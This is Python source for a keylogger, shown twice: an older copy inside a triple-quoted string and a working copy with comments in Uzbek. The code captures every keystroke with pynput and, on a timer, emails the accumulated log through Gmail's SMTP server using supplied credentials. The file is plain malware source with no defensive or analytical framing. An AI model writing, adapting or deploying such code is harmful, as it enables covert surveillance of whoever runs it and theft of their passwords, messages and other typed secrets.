"""import threading
import smtplib
import pynput.keyboard

class Keylogger:
    def __init__(self,time_interval, email, password):
        self.log="Keylogger started"
        self.interval=time_interval
        self.email=email
        self.password=password

    def append_to_log(self,string):
        self.log=self.log+string

    def process_key_press(self,key):
        try:
            current_key=bytes(key.char)
        except AttributeError:
            if key==key.space:
                current_key=" "
            else:
                current_key=" "+ bytes(key) +" "
        self.append_to_log(current_key)

    def report(self):
        self.send_mail(self.email,self.password,self.log)
        self.log=""
        timer=threading.Timer(self.interval, self.report)
        timer.start()
    def send_mail(self, email, password, message):
        server=smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email,email,message)
        server.quit()

    def start(self):
        keyboard_listener=pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()















"""
import threading
import smtplib
import pynput.keyboard

class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger started\n"
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)  # Faqat yozma belgilarda char qiymati ishlatiladi
        except AttributeError:
            if key == key.space:
                current_key = " "  # Bo'sh joy tugmasi
            else:
                current_key = " [" + str(key) + "] "  # Maxsus tugmalarni logga qo'shish
        self.append_to_log(current_key)

    def report(self):
        self.send_mail(self.email, self.password, self.log)
        self.log = ""  # Logni tozalash
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)  # SMTP server, port 587
        server.starttls()  # Shifrlashni boshlash
        server.login(email, password)  # Elektron pochtaga kirish
        server.sendmail(email, email, message)  # Xabarni yuborish
        server.quit()  # Serverdan chiqish

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()  # Loglarni yuborishni boshlash
            keyboard_listener.join()  # Eshitishni davom ettirish
